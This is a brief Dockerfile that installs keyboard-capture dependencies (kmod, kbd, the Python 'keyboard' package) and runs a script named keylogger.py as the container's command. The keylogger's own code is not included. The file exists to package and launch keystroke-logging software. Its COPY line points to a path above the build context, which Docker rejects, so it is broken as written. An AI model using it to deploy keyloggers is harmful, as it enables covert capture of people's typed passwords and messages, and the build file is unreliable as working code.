FROM python:3.7
WORKDIR /app
COPY ../logic/keylogger.py .

RUN apt-get update && \
    apt-get install -y kmod && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y kbd && \
    pip3 install keyboard

CMD ["python3", "keylogger.py"]
